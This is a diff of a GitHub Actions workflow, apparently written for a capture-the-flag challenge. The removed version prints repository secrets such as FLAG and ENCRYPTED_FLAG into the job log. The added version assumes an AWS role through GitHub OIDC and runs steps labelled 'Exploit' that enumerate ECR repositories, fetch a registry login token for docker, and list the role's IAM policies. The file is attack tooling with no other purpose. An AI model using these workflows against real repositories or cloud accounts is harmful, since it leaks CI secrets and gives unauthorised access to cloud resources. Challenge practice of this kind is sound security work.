@@ -1,20 +1,29 @@
-name: Extract Flag from Secrets
-
-on: workflow_dispatch
-
-permissions:
-  id-token: write
-  contents: read
+name: Assume AWS Role
+on: [push]
 
 jobs:
-  extract:
+  assume-role:
     runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
     steps:
-      - name: Print all possible secrets (if set)
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
+          aws-region: us-east-1
+          
+      - name: Exploit - List ECR repositories
         run: |
-          echo "=== Trying common secret names ==="
-          echo "ENCRYPTED_FLAG: ${{ secrets.ENCRYPTED_FLAG }}"
-          echo "FLAG: ${{ secrets.FLAG }}"
-          echo "BLOB: ${{ secrets.BLOB }}"
-          echo "SECRET: ${{ secrets.SECRET }}"
-          echo "CTF_FLAG: ${{ secrets.CTF_FLAG }}"
+          aws ecr describe-repositories
+          
+      - name: Exploit - Access ECR images
+        run: |
+          # Try to get ECR login token and pull images
+          aws ecr get-login-password | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
+          
+      - name: Exploit - Check IAM permissions
+        run: |
+          aws iam list-attached-role-policies --role-name imaginary-challenge
+          aws sts get-caller-identity
